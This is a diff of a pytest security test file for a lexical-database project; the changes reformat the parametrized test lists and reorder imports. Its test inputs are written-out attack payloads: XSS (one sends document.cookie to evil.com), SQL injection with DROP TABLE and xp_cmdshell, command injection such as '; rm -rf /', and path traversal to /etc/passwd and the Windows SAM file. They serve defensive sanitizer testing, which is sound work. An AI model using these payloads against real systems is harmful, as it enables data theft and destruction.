@@ -6,14 +6,14 @@ to prevent injection attacks and other security vulnerabilities.
 
 import pytest
 
-from src.utils.validation import (
-    sanitize_string,
-    sanitize_iso_code,
-    sanitize_identifier,
-    is_safe_string,
-)
 from src.adapters.base import RawLexicalEntry
 from src.models.lsr import LSR
+from src.utils.validation import (
+    is_safe_string,
+    sanitize_identifier,
+    sanitize_iso_code,
+    sanitize_string,
+)
 
 
 class TestXSSPrevention:
@@ -26,34 +26,43 @@ class TestXSSPrevention:
     applied at the presentation layer when content is rendered.
     """
 
-    @pytest.mark.parametrize("malicious_input", [
-        "<script>alert('xss')</script>",
-        "<<script>alert('xss')//<</script>",
-        "<ScRiPt>alert('xss')</ScRiPt>",
-        "<script>document.location='http://evil.com/'+document.cookie</script>",
-    ])
+    @pytest.mark.parametrize(
+        "malicious_input",
+        [
+            "<script>alert('xss')</script>",
+            "<<script>alert('xss')//<</script>",
+            "<ScRiPt>alert('xss')</ScRiPt>",
+            "<script>document.location='http://evil.com/'+document.cookie</script>",
+        ],
+    )
     def test_script_tags_flagged_unsafe(self, malicious_input):
         """Test that script tag payloads are flagged by is_safe_string."""
         assert is_safe_string(malicious_input) is False
 
-    @pytest.mark.parametrize("malicious_input", [
-        "<script>alert('xss')</script>",
-        "test\x00value\x1b[31m",
-    ])
+    @pytest.mark.parametrize(
+        "malicious_input",
+        [
+            "<script>alert('xss')</script>",
+            "test\x00value\x1b[31m",
+        ],
+    )
     def test_sanitize_string_removes_control_characters(self, malicious_input):
         """Test that sanitize_string strips control characters but preserves text."""
         result = sanitize_string(malicious_input)
         assert "\x00" not in result
         assert "\x1b" not in result
 
-    @pytest.mark.parametrize("malicious_input", [
-        "<img src=x onerror=alert('xss')>",
-        "<svg onload=alert('xss')>",
-        "javascript:alert('xss')",
-        "<iframe src='javascript:alert(1)'>",
-        "<body onload=alert('xss')>",
-        "<input onfocus=alert('xss') autofocus>",
-    ])
+    @pytest.mark.parametrize(
+        "malicious_input",
+        [
+            "<img src=x onerror=alert('xss')>",
+            "<svg onload=alert('xss')>",
+            "javascript:alert('xss')",
+            "<iframe src='javascript:alert(1)'>",
+            "<body onload=alert('xss')>",
+            "<input onfocus=alert('xss') autofocus>",
+        ],
+    )
     def test_other_xss_vectors_handled(self, malicious_input):
         """Test that other XSS vectors are handled (stored safely).
 
@@ -67,11 +76,14 @@ class TestXSSPrevention:
         # Full XSS prevention requires output encoding when rendering
         assert isinstance(result, str)
 
-    @pytest.mark.parametrize("malicious_input", [
-        "<script>alert('xss')</script>",
-        "test<script>evil</script>word",
-        "<img src=x onerror=alert(1)>",
-    ])
+    @pytest.mark.parametrize(
+        "malicious_input",
+        [
+            "<script>alert('xss')</script>",
+            "test<script>evil</script>word",
+            "<img src=x onerror=alert(1)>",
+        ],
+    )
     def test_xss_in_lsr_form(self, malicious_input):
         """Test that XSS in LSR form field is handled safely."""
         lsr = LSR(
@@ -83,10 +95,13 @@ class TestXSSPrevention:
         # When rendered, it should be escaped
         assert lsr.form_orthographic is not None
 
-    @pytest.mark.parametrize("malicious_input", [
-        "<script>alert('xss')</script>",
-        "A definition with <img src=x onerror=alert(1)> embedded",
-    ])
+    @pytest.mark.parametrize(
+        "malicious_input",
+        [
+            "<script>alert('xss')</script>",
+            "A definition with <img src=x onerror=alert(1)> embedded",
+        ],
+    )
     def test_xss_in_definitions(self, malicious_input):
         """Test that XSS in definitions is handled safely."""
         lsr = LSR(
@@ -106,15 +121,18 @@ class TestSQLInjectionPrevention:
     raw SQL, but we test parameterization patterns anyway.
     """
 
-    @pytest.mark.parametrize("malicious_input", [
-        "'; DROP TABLE users; --",
-        "1 OR 1=1",
-        "1; DELETE FROM users",
-        "' UNION SELECT * FROM passwords --",
-        "admin'--",
-        "1' AND '1'='1",
-        "'; EXEC xp_cmdshell('dir'); --",
-    ])
+    @pytest.mark.parametrize(
+        "malicious_input",
+        [
+            "'; DROP TABLE users; --",
+            "1 OR 1=1",
+            "1; DELETE FROM users",
+            "' UNION SELECT * FROM passwords --",
+            "admin'--",
+            "1' AND '1'='1",
+            "'; EXEC xp_cmdshell('dir'); --",
+        ],
+    )
     def test_sql_injection_in_form(self, malicious_input):
         """Test that SQL injection payloads in form are handled safely."""
         # These should be treated as literal strings, not executed
@@ -126,10 +144,13 @@ class TestSQLInjectionPrevention:
         # Should store as literal string
         assert lsr.form_orthographic == malicious_input
 
-    @pytest.mark.parametrize("malicious_input", [
-        "'; DROP TABLE users; --",
-        "test' OR '1'='1",
-    ])
+    @pytest.mark.parametrize(
+        "malicious_input",
+        [
+            "'; DROP TABLE users; --",
+            "test' OR '1'='1",
+        ],
+    )
     def test_sql_injection_in_raw_entry(self, malicious_input):
         """Test that SQL injection in raw entries is handled safely."""
         entry = RawLexicalEntry(
@@ -147,16 +168,19 @@ class TestSQLInjectionPrevention:
 class TestCommandInjectionPrevention:
     """Test prevention of command injection attacks."""
 
-    @pytest.mark.parametrize("malicious_input", [
-        "; rm -rf /",
-        "| cat /etc/passwd",
-        "$(whoami)",
-        "`id`",
-        "&& ls -la",
-        "|| echo vulnerable",
-        "\n/bin/sh",
-        "%0Aid",
-    ])
+    @pytest.mark.parametrize(
+        "malicious_input",
+        [
+            "; rm -rf /",
+            "| cat /etc/passwd",
+            "$(whoami)",
+            "`id`",
+            "&& ls -la",
+            "|| echo vulnerable",
+            "\n/bin/sh",
+            "%0Aid",
+        ],
+    )
     def test_command_injection_sanitized(self, malicious_input):
         """Test that command injection payloads are neutralized."""
         result = sanitize_string(malicious_input)
@@ -169,14 +193,17 @@ class TestCommandInjectionPrevention:
 class TestPathTraversalPrevention:
     """Test prevention of path traversal attacks."""
 
-    @pytest.mark.parametrize("malicious_input", [
-        "../../../etc/passwd",
-        "..\\..\\..\\windows\\system32\\config\\sam",
-        "....//....//....//etc/passwd",
-        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-        "..%252f..%252f..%252fetc/passwd",
-        "/etc/passwd%00.txt",
-    ])
+    @pytest.mark.parametrize(
+        "malicious_input",
+        [
+            "../../../etc/passwd",
+            "..\\..\\..\\windows\\system32\\config\\sam",
+            "....//....//....//etc/passwd",
+            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+            "..%252f..%252f..%252fetc/passwd",
+            "/etc/passwd%00.txt",
+        ],
+    )
     def test_path_traversal_in_identifier(self, malicious_input):
         """Test that path traversal in identifiers is handled safely."""
         result = sanitize_identifier(malicious_input)
@@ -189,12 +216,15 @@ class TestPathTraversalPrevention:
 class TestNullByteInjection:
     """Test prevention of null byte injection attacks."""
 
-    @pytest.mark.parametrize("malicious_input", [
-        "test\x00.txt",
-        "file\x00.php",
-        "data\x00<script>",
-        "\x00\x00\x00",
-    ])
+    @pytest.mark.parametrize(
+        "malicious_input",
+        [
+            "test\x00.txt",
+            "file\x00.php",
+            "data\x00<script>",
+            "\x00\x00\x00",
+        ],
+    )
     def test_null_byte_handled(self, malicious_input):
         """Test that null bytes are handled safely."""
         result = sanitize_string(malicious_input)
@@ -206,13 +236,16 @@ class TestNullByteInjection:
 class TestUnicodeAttacks:
     """Test prevention of Unicode-based attacks."""
 
-    @pytest.mark.parametrize("malicious_input", [
-        "\u202e\u0065\u006c\u0069\u0066",  # Right-to-left override
-        "\ufeff<script>",  # BOM + script
-        "test\u0000script",  # Null in middle
-        "\u2028\u2029",  # Line/paragraph separators
-        "test\uffff",  # Invalid Unicode
-    ])
+    @pytest.mark.parametrize(
+        "malicious_input",
+        [
+            "\u202e\u0065\u006c\u0069\u0066",  # Right-to-left override
+            "\ufeff<script>",  # BOM + script
+            "test\u0000script",  # Null in middle
+            "\u2028\u2029",  # Line/paragraph separators
+            "test\uffff",  # Invalid Unicode
+        ],
+    )
     def test_unicode_attacks_handled(self, malicious_input):
         """Test that Unicode attacks are handled safely."""
         result = sanitize_string(malicious_input)
@@ -266,12 +299,15 @@ class TestInputLengthLimits:
 class TestISOCodeValidation:
     """Test ISO code validation security."""
 
-    @pytest.mark.parametrize("malicious_input", [
-        "<script>",
-        "'; DROP",
-        "../../../",
-        "eng; rm -rf",
-    ])
+    @pytest.mark.parametrize(
+        "malicious_input",
+        [
+            "<script>",
+            "'; DROP",
+            "../../../",
+            "eng; rm -rf",
+        ],
+    )
     def test_malicious_iso_codes_rejected(self, malicious_input):
         """Test that malicious ISO codes are handled safely."""
         result = sanitize_iso_code(malicious_input)
@@ -293,22 +329,28 @@ class TestISOCodeValidation:
 class TestSafeStringCheck:
     """Test the is_safe_string utility."""
 
-    @pytest.mark.parametrize("safe_input", [
-        "hello",
-        "test word",
-        "café",
-        "日本語",
-        "hello-world_123",
-    ])
+    @pytest.mark.parametrize(
+        "safe_input",
+        [
+            "hello",
+            "test word",
+            "café",
+            "日本語",
+            "hello-world_123",
+        ],
+    )
     def test_safe_strings_accepted(self, safe_input):
         """Test that safe strings are identified as safe."""
         assert is_safe_string(safe_input) is True
 
-    @pytest.mark.parametrize("unsafe_input", [
-        "<script>",
-        "hello\x00world",
-        "",
-    ])
+    @pytest.mark.parametrize(
+        "unsafe_input",
+        [
+            "<script>",
+            "hello\x00world",
+            "",
+        ],
+    )
     def test_unsafe_strings_rejected(self, unsafe_input):
         """Test that unsafe strings are identified."""
         result = is_safe_string(unsafe_input)
